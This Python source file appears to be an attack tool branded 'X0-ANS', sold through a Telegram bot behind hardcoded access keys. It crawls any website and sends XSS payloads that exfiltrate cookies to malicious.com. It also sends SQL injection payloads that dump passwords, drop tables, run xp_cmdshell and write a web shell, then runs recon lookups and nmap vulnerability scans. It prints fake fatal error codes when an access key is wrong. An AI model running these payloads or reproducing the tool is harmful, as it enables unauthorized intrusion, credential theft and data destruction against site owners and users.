import requests
from bs4 import BeautifulSoup
import socket
import nmap
import subprocess
import concurrent.futures
from colorama import Fore, Style, init
import re
import os
import difflib
import time
import pyfiglet
import random
import sys
import ssl
import dns.resolver
import json

# Initialize colorama
init(autoreset=True)

# List of valid API keys
VALID_API_KEYS = ["x0old", "x0m7s", "X0ANS", "anonymous arabs", "x0dark", "x0black widow", "x0round", "key3", "key2"]  # Add more keys as needed

os.system('clear')


def slow_print(text, color, delay=0.05):
    """Print text slowly with color control."""
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(delay)
    print(Style.RESET_ALL)  # Reset after printing

def check_api_key():
    # Initial message in white with slow print
    slow_print("Please enter your tool access key. If you don't have one, purchase it ..", Fore.WHITE, delay=0.02)
    print("")
    
    # Second message in blue without slow print
    print(Fore.CYAN + "To purchase access keys, contact us via this Telegram bot:" + Style.RESET_ALL)
    
    # Telegram username in red with slow print
    slow_print("https://t.me/AnonDos777Bot", Fore.RED, delay=0.05)
    
    print("")
    
    while True:
        # Request for input key in green with fast slow print
        slow_print("Please enter your API key 🔑 : ", Fore.GREEN, delay=0.02)
        
        # User input in red
        user_input = input(Fore.MAGENTA).strip()  # Use .strip() to remove leading/trailing spaces
        
        # Reset styles after user input
        print(Style.RESET_ALL)

        # If the user input is empty (just Enter), ask again
        if not user_input:
            print(Fore.RED + "Error: You must enter a valid key. Please try again." + Style.RESET_ALL)
            continue  # Loop again to ask for input

        # Check if the entered key is in the valid list
        if user_input in VALID_API_KEYS:
            print(Fore.GREEN + "Welcome!" + Fore.RESET)
            print(Fore.WHITE + "Press Enter to proceed ▶️" + Fore.RESET)
            input()  # Wait for user to press Enter
            return True  # Allow access to the tool
        else:
            # Print random fake error codes to stop the program
            print(Fore.RED + "Invalid access key, please enter a correct key to enter ❌" + Style.RESET_ALL)
            generate_fake_errors()
            return False

def generate_fake_errors():
    # Generate random fake error codes
    for i in range(10):
        print(f"Error {i+1}: {random.randint(1000, 9999)} - Fatal system error.")
    sys.exit()  # Exit the program after printing fake codes

# Run the old tool function
def run_old_tool():
    print("Running the old tool...")
    # Place old tool code here

def main():
    # Check the entered key
    if check_api_key():
        # If the key is valid, run the tool
        run_old_tool()

if __name__ == "__main__":
    main()

# Create a session object
session = requests.Session()

# Set up session to manage redirects and User-Agent
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
})

# Function to print colored text
def print_colored(text, color):
    print(color + text + Style.RESET_ALL)
    
# Input function that validates user input
def enter_num():
    while True:  # Infinite loop until a valid number is entered
        choice = input(Fore.YELLOW + "Choose one of these options by entering its number: " + Style.RESET_ALL + "\n")

        if choice == '1':
            vuln_menu()  # Go to vulnerability scan
            break  # Exit the loop after valid input
        elif choice == '2':
            gather_info_menu()  # Go to information gathering
            break  # Exit the loop after valid input
        else:
            print_colored("Invalid choice! Please enter a valid number.", Fore.RED)

# Function to show logo with slow print
def show_logo():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')  
    
    logo_text = "X0-ANS"
    subtitle = "Anonymous Arabs Organization"
    urlans = "Telegram : "
    urlas = "https://t.me/Anonymusarabs"
    
    # Generate large logo using pyfiglet with a bigger font
    big_logo = pyfiglet.figlet_format(logo_text, font="banner3-D")

    # Display the big logo with slow print
    for line in big_logo.splitlines():
        print(Fore.RED + Style.BRIGHT + line, flush=True)
        time.sleep(0.1)  # Delay between lines for effect

    print()  # New line after logo

    # Display the subtitle with delay
    for char in subtitle:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.02)
    
    print("\n")  # New line after title

    # Display Telegram link with delay
    for char in urlans:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.02)

    for char in urlas:
        print(Fore.RED + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.05)

    print("\n")  # New line after link

    # Delay before showing menu
    time.sleep(0.4)

# Main menu function
def main_menu():
    show_logo()
    print_colored("========================================", Fore.CYAN)
    print_colored("           Vulnerability Testing Tool           ", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    print()
    print_colored("1. Vulnerability Scan", Fore.MAGENTA)
    print_colored("2. Gather Website Information", Fore.MAGENTA)
    print()
    print_colored("========================================", Fore.RED)
    print()
    enter_num()

# List of known sites for comparison
known_sites = [
    "www.google.com", "www.facebook.com", "www.youtube.com", 
    "www.amazon.com", "www.wikipedia.org", "www.example.com"
]

# Function to validate URL
def validate_url(url):
    pattern = r'^(www\.)?([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,6}$'
    return re.match(pattern, url) is not None

# Function to suggest similar URLs based on available links using difflib
def suggest_url(url):
    suggestions = difflib.get_close_matches(url, known_sites, n=3, cutoff=0.6)  # Similarity threshold of 60%
    return suggestions if suggestions else None

# Function to check if the site is operational
def check_site_status(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print_colored(f"The site is unavailable. HTTP Status: {response.status_code}", Fore.RED)
            return False
    except requests.RequestException:
        print_colored("The site is unavailable or there is a connection error.", Fore.RED)
        return False

# Validate the entered protocol
def validate_protocol(protocol_choice):
    if protocol_choice not in ['1', '2']:
        print_colored("Please choose a valid protocol (1 for HTTP or 2 for HTTPS)", Fore.RED)
        return False
    return True

# List of vulnerabilities to scan with associated checking functions
def vuln_menu():
    print_colored("\nVulnerability Scan", Fore.CYAN)

    # Validate site input without protocol
    while True:
        url = input(Fore.YELLOW + "Enter the site link without the protocol (e.g., www.example.com): " + Style.RESET_ALL + "\n")
        
        if validate_url(url):
            break
        else:
            suggested_urls = suggest_url(url)
            if suggested_urls:
                print_colored("The link is invalid. Did you mean one of the following links?", Fore.YELLOW)
                for suggested in suggested_urls:
                    print_colored(f"- {suggested}", Fore.GREEN)
                url = suggested_urls[0]  # Choose the first suggestion as default
                break
            else:
                print_colored("Invalid link and no suggestions available. Please enter a valid link.", Fore.RED)

    # Validate the entered protocol
    while True:
        print_colored("1. HTTP", Fore.GREEN)
        print_colored("2. HTTPS", Fore.GREEN)
        protocol_choice = input(Fore.YELLOW + "Choose the protocol: " + Style.RESET_ALL + "\n")
        if validate_protocol(protocol_choice):
            break

    protocol = 'https://' if protocol_choice == '2' else 'http://'
    target_url = protocol + url

    # Check if the site is operational
    while True:
        if check_site_status(target_url):
            break
        else:
            url = input(Fore.YELLOW + "Enter an operational site link without the protocol (e.g., www.example.com): " + Style.RESET_ALL + "\n")
            if validate_url(url):
                target_url = protocol + url

    print_colored("\nSelect the type of examination ( 1 , 2 , 3 , 4 ) :", Fore.CYAN)
    print_colored("1. XSS Check", Fore.GREEN)
    print_colored("2. SQL Injection Check", Fore.GREEN)
    print_colored("3. CSRF Check", Fore.GREEN)
    print_colored("4. Comprehensive scan for all vulnerabilities", Fore.GREEN)
    print_colored("5. Return to previous list", Fore.GREEN)
    
    vuln_choice = input(Fore.YELLOW + "Choose the type of examination :" + Style.RESET_ALL + "\n")
    
    if vuln_choice == '1':
        print_colored("\n XSS checking...", Fore.CYAN)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<script>document.body.appendChild(document.createElement(\'script\')).src=\'http://malicious.com/mal.js\'</script>',
            '<script>fetch(\'http://malicious.com/?cookie=\' + document.cookie)</script>',
            '<script>window.location=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<script>console.log(\'XSS\')</script>',
            '<script>eval(\'alert(1)\')</script>',
            '<script>new Image().src=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<a href="#" onclick="alert(1)">Click me</a>',
            '<button onclick="alert(1)">Click me</button>',
            '<div onmouseover="alert(1)">Hover over me</div>',
            '<input type="text" value="test" onfocus="alert(1)">',
            '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
            '<style>@import\'http://malicious.com/mal.css\';</style>',
            '<script>setTimeout(function() { alert(1); }, 1000);</script>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<script src="http://malicious.com/mal.js"></script>',
            '{"data": "<script>alert(1)</script>"}',
            '{"value": "<img src=x onerror=alert(1)>"}',
            '<script>document.write(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>var encoded = \'YWxlcnQoMSk=\'; eval(atob(encoded));</script>',
            '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
            '<svg><script>alert(1)</script></svg>',
            '<script>var x = document.createElement("script"); x.src = "http://malicious.com/mal.js"; document.body.appendChild(x);</script>',
            '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTw8L3NjcmlwdD4=">'
        ]
        crawl_and_test(target_url, xss_payloads, "XSS")

    elif vuln_choice == '2':
        print_colored("\n SQL Injection Check...", Fore.CYAN)
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL -- ",
            "' UNION SELECT 1, 'test' -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION ALL SELECT NULL,NULL -- ",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; --",
            "'; --",
            "' OR 1=1; --",
            "' AND 1=0 UNION SELECT NULL, @@version --",
            "' AND SUBSTRING(password, 1, 1) = 'a' --",
            "'; EXEC master..xp_cmdshell('net user'); --",
            "' UNION SELECT NULL, password FROM users WHERE username='admin' -- ",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND ASCII(LEFT((SELECT user_login FROM users LIMIT 1),1)) > 0 --",
            "' AND LENGTH(password) = 5; --",
            "' OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "' OR (SELECT IF(1=1, SLEEP(5), 0)); --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; EXECUTE IMMEDIATE 'SELECT password FROM users WHERE username = ''admin'''; --"
        ]
        crawl_and_test(target_url, sql_payloads, "SQL Injection")

    elif vuln_choice == '3':
        print_colored("\n CSRF check...", Fore.CYAN)
        crawl_and_test_csrf(target_url)

    elif vuln_choice == '4':
        print_colored("\n Comprehensive scan for all vulnerabilities...", Fore.CYAN)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<script>document.body.appendChild(document.createElement(\'script\')).src=\'http://malicious.com/mal.js\'</script>',
            '<script>fetch(\'http://malicious.com/?cookie=\' + document.cookie)</script>',
            '<script>window.location=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<script>console.log(\'XSS\')</script>',
            '<script>eval(\'alert(1)\')</script>',
            '<script>new Image().src=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<a href="#" onclick="alert(1)">Click me</a>',
            '<button onclick="alert(1)">Click me</button>',
            '<div onmouseover="alert(1)">Hover over me</div>',
            '<input type="text" value="test" onfocus="alert(1)">',
            '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
            '<style>@import\'http://malicious.com/mal.css\';</style>',
            '<script>setTimeout(function() { alert(1); }, 1000);</script>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<script src="http://malicious.com/mal.js"></script>',
            '{"data": "<script>alert(1)</script>"}',
            '{"value": "<img src=x onerror=alert(1)>"}',
            '<script>document.write(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>var encoded = \'YWxlcnQoMSk=\'; eval(atob(encoded));</script>',
            '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
            '<svg><script>alert(1)</script></svg>',
            '<script>var x = document.createElement("script"); x.src = "http://malicious.com/mal.js"; document.body.appendChild(x);</script>',
            '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTw8L3NjcmlwdD4=">'
        ]
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL -- ",
            "' UNION SELECT 1, 'test' -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION ALL SELECT NULL,NULL -- ",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; --",
            "'; --",
            "' OR 1=1; --",
            "' AND 1=0 UNION SELECT NULL, @@version --",
            "' AND SUBSTRING(password, 1, 1) = 'a' --",
            "'; EXEC master..xp_cmdshell('net user'); --",
            "' UNION SELECT NULL, password FROM users WHERE username='admin' -- ",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND ASCII(LEFT((SELECT user_login FROM users LIMIT 1),1)) > 0 --",
            "' AND LENGTH(password) = 5; --",
            "' OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "' OR (SELECT IF(1=1, SLEEP(5), 0)); --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; EXECUTE IMMEDIATE 'SELECT password FROM users WHERE username = ''admin'''; --"
        ]
        
        crawl_and_test(target_url, xss_payloads, "XSS")
        crawl_and_test(target_url, sql_payloads, "SQL Injection")
        crawl_and_test_csrf(target_url)

    elif vuln_choice == '5':
        main_menu()  # Back to main menu
    else:
        print_colored("Incorrect choice!", Fore.RED)
        vuln_menu()

    post_scan_options()

def post_scan_options():
    slow_print("\n Do you want to :", Fore.CYAN, delay=0.05)
    print("1. Return to the checklist")
    print("2. Terminate the program")
    
    while True:
        choice = input(Fore.YELLOW + "Choose an option: ")
        if choice == '1':
            main_menu()
            break
        elif choice == '2':
            print_colored("Thank you for using the tool ❤️", Fore.CYAN)
            exit()
        else:
            slow_print("Incorrect choice 🚫 Please choose a valid option.", Fore.RED, delay=0.01)



# الزحف واختبار الثغرات
def crawl_and_test(url, payloads, vuln_type):
    print_colored(f"Crawl on the site:{url}", Fore.CYAN)
    crawled_urls, forms = crawl_site(url)

    # فحص الروابط والفورمز بشكل كامل واستخدام جميع البايلودات
    print_colored(f"\n Check the link for vulnerabilities. {vuln_type}...", Fore.CYAN)
    test_vulnerabilities(url, crawled_urls, forms, payloads, vuln_type)

# الزحف وجمع الروابط والفورمز من الموقع
def crawl_site(url):
    crawled_urls = set()
    forms = []

    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = requests.compat.urljoin(url, link['href'])
            if url in full_url and full_url not in crawled_urls:
                crawled_urls.add(full_url)
                time.sleep(1)  # إضافة تأخير بين كل طلب

        forms = soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print_colored(f"A mistake while crawling:🚫 : {e}", Fore.RED)
    
    return crawled_urls, forms
    
    # إنشاء كائن session
session = requests.Session()


# فحص الثغرات وتحديث التقرير
# محاولة فحص الرابط مع إعادة المحاولة في حالة حدوث خطأ
def test_vulnerabilities(base_url, urls, forms, payloads, vuln_type):
    report = []
    
    # فحص الروابط
    for url in urls:
        params = get_params(url)
        for param in params:
            for payload in payloads:
                new_url = f"{url}?{param}={payload}"
                attempt = 0
                while attempt < 3:  # إعادة المحاولة حتى 3 مرات
                    try:
                        response = session.get(new_url, timeout=10)
                        if payload in response.text:
                            report.append({
                                "vuln_type": vuln_type,
                                "param": param,
                                "url": url,
                                "payload": payload,
                                "direct_link": new_url
                            })
                            print_colored(f"✅ Exploit found {vuln_type} Discovered in this parameter : {param} In this link : {url}", Fore.GREEN)
                            break  # الانتقال إلى الباراميتر أو الفورم التالي بعد اكتشاف الثغرة
                        break
                    except requests.exceptions.RequestException as e:
                        attempt += 1
                        print_colored(f"خطأ أثناء فحص الرابط {url}: {e}, إعادة المحاولة ({attempt}/3)", Fore.RED)
                        time.sleep(1)  # انتظار قبل إعادة المحاولة

    # فحص الفورمات
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        action_url = requests.compat.urljoin(base_url, action) if action else base_url
        
        try:
            for payload in payloads:
                form_data = {input_tag.get('name'): payload for input_tag in inputs if input_tag.get('name')}
                if method == 'post':
                    response = session.post(action_url, data=form_data, timeout=10)
                else:
                    response = session.get(action_url, params=form_data, timeout=10)

                if payload in response.text:
                    report.append({
                        "vuln_type": vuln_type,
                        "form_action": action_url,
                        "payload": payload
                    })
                    print_colored(f"✅ Exploit  {vuln_type} In the form that started {action_url}", Fore.RED)
                    break  # الانتقال إلى الفورم التالي بعد اكتشاف الثغرة

        except requests.exceptions.RequestException as e:
            print_colored(f"🔴 Error checking form in link {action_url} : {e}", Fore.RED)

    generate_report(report)




# توليد تقرير مفصل عن الفحص
def generate_report(report):
    if report:
        report_text = ""  # لاحتواء نص التقرير
        for item in report:
            if 'param' in item:
                report_text += f"ثغرة {item['vuln_type']} مكتشفة في الباراميتر '{item['param']}' في الرابط {item['url']}\n"
                report_text += f"رابط مباشر: {item['direct_link']}\n"
                report_text += f"البايلود المستخدم: {item['payload']}\n\n"
            if 'form_action' in item:
                report_text += f"ثغرة {item['vuln_type']} مكتشفة في الفورم في الرابط {item['form_action']}\n"
                report_text += f"البايلود المستخدم: {item['payload']}\n\n"

        # سؤال المستخدم إذا كان يريد حفظ التقرير
        print("")
        
        save_choice = input(Fore.YELLOW + "Do you want to save the report to a text file? (y/n) :").strip().lower()
        
        print("")
        
        if save_choice in ['y', 'yes']:
            save_report_to_file(report_text)
        elif save_choice in ['n', 'no']:
            print("Thank you ❤️")
        else:
            print("🚫 Invalid selection. Thank you for using the tool ❤️")
    else:
        print_colored("🔴 No vulnerabilities were found , No Exploit ❌.", Fore.RED)

# دالة لحفظ التقرير في ملف
def save_report_to_file(report):
    while True:
        print("")
        file_name = input(Fore.YELLOW + "Type the file name with the extension ( .txt ) :" + Style.RESET_ALL + "\n").strip()
        if file_name.endswith(".txt"):
            print("")
            file_path = file_name
            break
        else:
            print("Please make sure to add the .txt extension to the file name.", Fore.RED)

    with open(file_path, "w", encoding='utf-8') as file:
        file.write(report)
    print(f"✅ The report has been saved to the file : {os.path.abspath(file_path)}")

# دالة لطباعة النص بلون محدد (مطلوبة للوظائف)
def print_colored(text, color):
    print(color + text + Fore.RESET)


# الزحف واختبار الثغرات (محدث)
def crawl_and_test(url, payloads, vuln_type):
    print_colored(f" {url}", Fore.CYAN)
    crawled_urls, forms = crawl_site(url)

    # فحص الروابط والفورمز بشكل كامل واستخدام جميع البايلودات
    print_colored(f"\n Check the link for vulnerabilities. {vuln_type}...", Fore.CYAN)
    test_vulnerabilities(url, crawled_urls, forms, payloads, vuln_type)


# الزحف واختبار CSRF (مطور)
def crawl_and_test_csrf(url):
    print(f" {url}")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    forms = soup.find_all('form')
    csrf_vulns = []

    for form in forms:
        action = form.get('action')
        form_url = url + action if action else url
        inputs = form.find_all('input')

        has_csrf_token = False

        # التحقق من وجود حقل CSRF في الفورم
        for input_tag in inputs:
            input_name = input_tag.get('name')
            if 'csrf' in input_name.lower() or 'token' in input_name.lower():
                has_csrf_token = True

        # التحقق من وجود meta tag للـ CSRF
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        if csrf_meta:
            has_csrf_token = True

        # التحقق من هيدر SameSite
        cookies = response.headers.get('Set-Cookie', '')
        if 'SameSite' not in cookies:
            print_colored(f"🔴 warning : The site is not used SameSite To protect the site from a vulnerability => CSRF", Fore.YELLOW)

        # التحقق من هيدر Referer
        if 'Referer' not in response.headers:
            print_colored(f"🔴 Warning : The site does not check the referrer header for CSRF protection .", Fore.YELLOW)

        # إذا لم يتم العثور على رمز CSRF
        if not has_csrf_token:
            csrf_vulns.append(form_url)

    if csrf_vulns:
        print_colored("⚠️ The site may be vulnerable to CSRF ", Fore.RED)
        for vuln in csrf_vulns:
            print(f"📍The site may have a CSRF vulnerability in this link : {vuln}")
    else:
        print_colored("🔰The site is not infected with CSRF vulnerability", Fore.GREEN)


# استخراج البارامترات من الروابط
def get_params(url):
    if '?' not in url:
        return []
    params = url.split('?')[1]
    return [param.split('=')[0] for param in params.split('&')]

# دالة لطباعة النص بألوان
def print_colored(text, color):
    print(color + text + Style.RESET_ALL)

# التحقق من أن الموقع يعمل
def check_site_status(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print_colored(f"The site is unavailable. HTTP Status: {response.status_code}", Fore.RED)
            return False
    except requests.RequestException:
        print_colored("The site is unavailable or there is a connection error.", Fore.RED)
        return False

# التحقق من صحة اختيار البروتوكول
def validate_protocol(protocol_choice):
    if protocol_choice not in ['1', '2']:
        print_colored("Please choose a valid protocol (1 for HTTP or 2 for HTTPS)", Fore.RED)
        return False
    return True

# قائمة جمع المعلومات
def gather_info_menu():
    print_colored("\nCollect information about site", Fore.CYAN)

    # التحقق من صحة الرابط المدخل
    while True:
        url = input(Fore.YELLOW + "Enter the site link without the protocol (e.g., example.com): " + Style.RESET_ALL + "\n")
        
        # تحقق مما إذا كان الرابط يحتوي على بروتوكول
        if url.startswith("http://") or url.startswith("https://"):
            print_colored("Please enter the site link without the protocol.", Fore.RED)
        elif validate_url(url):
            break
        else:
            print_colored("Invalid link. Please enter a valid link.", Fore.RED)

    # التحقق من صحة البروتوكول المدخل
    while True:
        print_colored("1. HTTP", Fore.GREEN)
        print_colored("2. HTTPS", Fore.GREEN)
        protocol_choice = input(Fore.YELLOW + "Choose the protocol: " + Style.RESET_ALL + "\n")
        if validate_protocol(protocol_choice):
            break

    protocol = 'https://' if protocol_choice == '2' else 'http://'
    target_url = protocol + url

    # التحقق من أن الموقع يعمل
    while True:
        if check_site_status(target_url):
            break
        else:
            url = input(Fore.YELLOW + "Enter an operational site link without the protocol (e.g., example.com): " + Style.RESET_ALL + "\n")
            if validate_url(url):
                target_url = protocol + url

    # الحصول على IP الحقيقي للموقع
    real_ips = get_real_ip(url)
    if real_ips:
        print_colored(f"Real IP(s) for {url}: {', '.join(real_ips)}", Fore.GREEN)

    # تنفيذ جمع المعلومات على الرابط المدخل
    gather_info(target_url)

# التحقق من صحة الرابط المدخل
def validate_url(url):
    # التحقق من وجود نقطة في الرابط، مما يعني تنسيق مقبول
    return "." in url

# الحصول على IP الحقيقي للموقع
def get_real_ip(domain):
    try:
        # الحصول على سجلات A للمجال
        answers = dns.resolver.resolve(domain, 'A')
        return [str(answer) for answer in answers]
    except Exception as e:
        print_colored(f"Failed to resolve IP: {e}", Fore.GREEN)
        return None

# جمع المعلومات عن الموقع
def gather_info(url):
    print_colored(f"\nCollect information about this site: {url}", Fore.CYAN)
    
    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # جمع عنوان IP
    domain = url.replace('http://', '').replace('https://', '')
    ip = socket.gethostbyname(domain)
    print_colored(f"IP : ", Fore.MAGENTA)
    print_colored(f" {ip}", Fore.GREEN)
    
    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # فحص SSL
    check_ssl(domain)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # جلب معلومات السيرفر
    try:
        wsheaders = requests.get(url).headers
        ws = wsheaders.get('Server', 'Could Not Detect')
        print_colored(f"Web Server: {ws}", Fore.GREEN)
    except requests.RequestException as e:
        print_colored(f"Error accessing to {url} : {e}", Fore.RED)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # كشف نوع الـ CMS
    cmssc = requests.get(url).text
    if '/wp-content/' in cmssc:
        tcms = "WordPress"
    elif 'Joomla' in cmssc:
        tcms = "Joomla"
    elif 'Drupal' in requests.get(f"{url}/misc/drupal.js").text:
        tcms = "Drupal"
    elif '/skin/frontend/' in cmssc:
        tcms = "Magento"
    else:
        tcms = "Could Not Detect"
    print_colored(f"CMS : ", Fore.GREEN)
    print_colored(f" {tcms} ", Fore.RED)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # فحص حماية Cloudflare
    check_cloudflare(domain)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # فحص robots.txt
    check_robots(url)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # معلومات WHOIS
    check_whois(domain)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # معلومات GEO IP
    check_geoip(domain)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # فحص DNS
    check_dns(domain)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # حساب Subnet
    check_subnet(domain)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # تحليل ملفات JavaScript
    analyze_js(url)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # فحص الرؤوس الأمنية الأساسية
    check_security_headers(wsheaders)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    # البحث عن عناوين البريد الإلكتروني وأرقام الهواتف
    extract_emails_and_phones(url)

    print_colored("========================================", Fore.CYAN)  # فاصلة بين العمليات

    #سؤال المستخدم عن فحث المنافذ
    start_port_check()
    
    # فحص المنافذ باستخدام Nmap
    check_ports(ip)
    
    

    # العودة إلى القائمة الرئيسية بعد انتهاء الفحص
    return_to_menu()

# فحص SSL
def check_ssl(domain):
    try:
        context = ssl.create_default_context()
        with context.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.connect((domain, 443))
            cert = s.getpeercert()
            print_colored(f"SSL Certificate Expiry: {cert['notAfter']}", Fore.GREEN)
    except Exception as e:
        print_colored(f"SSL Certificate check failed: {e}", Fore.RED)

# فحص حماية Cloudflare
def check_cloudflare(domain):
    try:
        urlhh = f"http://api.hackertarget.com/httpheaders/?q={domain}"
        resulthh = requests.get(urlhh).text
        cloudflare_status = "Detected" if 'cloudflare' in resulthh else "Not Detected"
        print_colored(f"Cloudflare: {cloudflare_status}", Fore.GREEN)
    except Exception as e:
        print_colored(f"خطأ أثناء فحص Cloudflare: {e}", Fore.RED)

# فحص robots.txt
def check_robots(url):
    rbturl = f"{url}/robots.txt"
    try:
        rbtresponse = requests.get(rbturl).text
        if rbtresponse:
            print_colored(f"Robots File Found :", Fore.GREEN)
            print_colored(f"{rbtresponse}", Fore.LIGHTYELLOW_EX)
        else:
            print_colored("Robots File Found But Empty!", Fore.YELLOW)
    except:
        print_colored("Could NOT Find robots.txt!", Fore.RED)

# معلومات WHOIS
def check_whois(domain):
    urlwhois = f"http://api.hackertarget.com/whois/?q={domain}"
    resultwhois = requests.get(urlwhois).text
    print_colored(f"WHOIS Lookup:\n{resultwhois}", Fore.GREEN)

# معلومات GEO IP
def check_geoip(domain):
    urlgip = f"http://api.hackertarget.com/geoip/?q={domain}"
    resultgip = requests.get(urlgip).text
    print_colored(f"GEO IP Lookup:\n{resultgip}", Fore.GREEN)

# فحص DNS
def check_dns(domain):
    urldlup = f"http://api.hackertarget.com/dnslookup/?q={domain}"
    resultdlup = requests.get(urldlup).text
    print_colored(f"DNS Lookup:\n{resultdlup}", Fore.GREEN)

# حساب Subnet
def check_subnet(domain):
    urlscal = f"http://api.hackertarget.com/subnetcalc/?q={domain}"
    resultscal = requests.get(urlscal).text
    print_colored(f"Subnet Calculation:\n{resultscal}", Fore.GREEN)

# بداية الفحص بسؤال المستخدم
def start_port_check():
    choice = input(Fore.MAGENTA + "Do you want to perform a port scan? (Yes/y or No/n): " + Style.RESET_ALL).strip().lower()
    
    if choice in ['yes', 'y']:
        
        check_ports(ip)
    elif choice in ['no', 'n']:
        # إذا كانت الإجابة لا، يتم إيقاف الفحص مع إظهار رسالة
        print_colored("⚠️ Port scan was not performed on the website.", Fore.RED)
    else:
        print_colored("🔴 Invalid choice. Please enter Yes/y or No/n.", Fore.RED)

def check_ports(ip):
    slow_print("Select an option:", Fore.YELLOW, delay=0.03)
    print_colored("1. Scan open ports and their versions", Fore.CYAN)
    print_colored("2. Scan ports and check for vulnerabilities", Fore.CYAN)
    
    option = input(Fore.MAGENTA + "Enter your choice (1 or 2): " + Style.RESET_ALL).strip()

    if option == '1':
        scan_open_ports(ip)
    elif option == '2':
        scan_ports_for_vulnerabilities(ip)
    else:
        print_colored("Invalid option. Please choose 1 or 2.", Fore.RED)

def check_ports(ip):
    slow_print("Select an option :", Fore.YELLOW, delay=0.01)
    print_colored("1. Scan open ports and their versions", Fore.CYAN)
    print_colored("2. Scan ports and check for vulnerabilities", Fore.CYAN)
    
    option = input(Fore.MAGENTA + "Enter your choice (1 or 2): " + Style.RESET_ALL).strip()

    if option == '1':
        scan_open_ports(ip)
    elif option == '2':
        scan_ports_for_vulnerabilities(ip)
    else:
        print_colored("Invalid option. Please choose 1 or 2.", Fore.RED)

# فحص المنافذ المفتوحة
def scan_open_ports(ip):
    while True:
        choice = input(Fore.MAGENTA + "Do you want to specify the number of ports to scan? (Yes/y or No/n) : " + Style.RESET_ALL).strip().lower()
        if choice in ['yes', 'y']:
            try:
                max_ports = int(input(Fore.YELLOW + "Enter the number of ports to scan (e.g., 300): " + Style.RESET_ALL))
                port_range = f'1-{max_ports}'
                break
            except ValueError:
                print_colored("Please enter a valid number.", Fore.RED)
        elif choice in ['no', 'n']:
            port_range = '1-65535'
            break
        else:
            print_colored("Wrong choice 🚫 Please choose a valid option.", Fore.RED)

    print_colored("The scan may take from 1 to 5 minutes. Please wait...", Fore.YELLOW)
    command = f"nmap -T5 -sT -p {port_range} --script-timeout 2s {ip}"
    
    try:
